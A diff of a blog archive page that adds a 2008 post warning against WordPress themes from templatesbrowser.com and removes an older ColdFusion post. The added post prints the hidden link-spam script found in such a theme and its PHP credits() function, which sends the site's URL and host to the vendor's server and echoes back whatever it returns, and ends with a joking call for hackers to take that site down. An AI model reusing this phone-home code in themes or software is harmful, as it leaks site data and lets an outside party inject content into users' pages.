@@ -7,7 +7,10 @@
 	<meta name="author" content="Michael Sharman">
 
 	
-	<meta name="description" content="I read a post today from Mark Kruger where he was warning against the possible side effects when using GET as a form submit method. I think I ( &hellip;">
+	<meta name="description" content="Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source: 1
+2
+3
+var CCounter=2151068; &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -82,6 +85,100 @@
 
 	
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes/">
+		
+			Don&#8217;t Ever User www.templatesbrowser.com for Wordpress Themes</a>
+	</h2>
+	<div class="entry-content">
+		<p>Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">nosc</span><span class="o">/</span><span class="nx">ript</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">hreflang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">lang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;http://www.portalux.com/&quot;</span><span class="o">&gt;</span><span class="nx">online</span> <span class="nx">casino</span><span class="o">&lt;</span><span class="err">/a&gt;&lt;/nosc/ript&gt;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>My investigations found that where I downloaded the template from was a nice (NOT) little site called <a href="http://www.templatesbrowser.com/wordpress-themes/">http://www.templatesbrowser.com/</a>. Now what they do is add a &#8220;functions.php&#8221; file in the original code base, then call a method from the footer &#8220;credits();&#8221; which is in the functions.php file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">credits</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'> <span class="nx">$url</span> <span class="o">=</span> <span class="s2">&quot;http://get.templatesbrowser.com/wp.php?&quot;</span> <span class="p">.</span>
+</span><span class='line'>       <span class="s2">&quot;url=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">])</span> <span class="p">.</span> <span class="s2">&quot;&amp;&quot;</span> <span class="p">.</span> <span class="s2">&quot;host=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]);</span>
+</span><span class='line'> <span class="nx">$check</span> <span class="o">=</span> <span class="err">@</span><span class="nx">fsockopen</span><span class="p">(</span><span class="s2">&quot;get.templatesbrowser.com&quot;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">$errno</span><span class="p">,</span> <span class="nx">$errstr</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="nx">$check</span><span class="p">)</span>
+</span><span class='line'> <span class="p">{</span>
+</span><span class='line'>  <span class="err">@</span><span class="nx">readfile</span><span class="p">(</span><span class="nx">$url</span><span class="p">);</span>
+</span><span class='line'>  <span class="nx">fclose</span><span class="p">(</span><span class="nx">$check</span><span class="p">);</span>
+</span><span class='line'> <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">?&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>More information was found from <a href="http://www.onnoot.com/e/532/Templatesbrowser.com_puts_link_spam_in_WordPress">www.onnoot.com/</a>:</p>
+
+<blockquote><p>This produces a link at the bottom of every WordPress page, that is invisible for human readers.</p>
+
+<p>Templatesbrowser.com apparently does this to increase the pagerank of certain websites. Weâ€™re not sure if Google falls for this little link spam trick. But if Google does find out that your page contains link spam, you risk being punished. That could mean that your website is removed from Google&#8217;s search result pages.</p></blockquote>
+
+<p>So for those who don&#8217;t know I hope this was useful, if any people out there are crackers/hackers do me a favour and pull their site down :)</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2008-01-24T15:43:02+11:00" pubdate data-updated="true">Jan 24<span>th</span>, 2008</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/categories/misc/'>Misc</a>, <a class='category' href='/categories/php/'>php</a>
+
+
+</div>
+	
+		<div class="comments"><a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes//page/16/index.html#disqus_thread">Comments</a></div>
+	
+</div></article>
 
 
     <article class="post">
@@ -953,58 +1050,6 @@ I&#8217;ve been annoyed many times with the whole chr(10)chr(13) on Windows vs c
 </div>
 	
 		<div class="comments"><a href="/2007/11/01/cfml-reference-docs-for-the-ipod//page/16/index.html#disqus_thread">Comments</a></div>
-	
-</div></article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/2007/11/01/coldfusion-8-can-now-use-cacheaftercachewithin-when-using-cfqueryparams/">
-		
-			ColdFusion 8 Can Now Use cacheAfter/cacheWithin When Using Cfqueryparam&#8217;s</a>
-	</h2>
-	<div class="entry-content">
-		<p>I just noticed this in the <a href="http://livedocs.adobe.com/coldfusion/8/htmldocs/help.html?content=Tags_p-q_18.html">Adobe docs</a> for cfqueryparam in ColdFusion 8:</p>
-
-<blockquote><p>Revised 8/21/2007: Removed limitation on using the cfquery cachedAfter or cachedWithin attributes with cfqueryparam.This limit no longer applies.</p></blockquote>
-
-<p>This is great news because before (MX7 and below):</p>
-
-<blockquote><p>You cannot use the cfquery cachedAfter or cachedWithin attributes with cfqueryparam.</p></blockquote>
-
-<p>I know many people didn&#8217;t like this limitation as it meant you needed to go to extra lengths to perform query caching (such as Application scope etc).</p>
-
-<p>This is another reason why CF8 is so good :)</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2007-11-01T09:19:48+11:00" pubdate data-updated="true">Nov 1<span>st</span>, 2007</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/categories/coldfusion/'>ColdFusion</a>
-
-
-</div>
-	
-		<div class="comments"><a href="/2007/11/01/coldfusion-8-can-now-use-cacheaftercachewithin-when-using-cfqueryparams//page/16/index.html#disqus_thread">Comments</a></div>
 	
 </div></article>
 
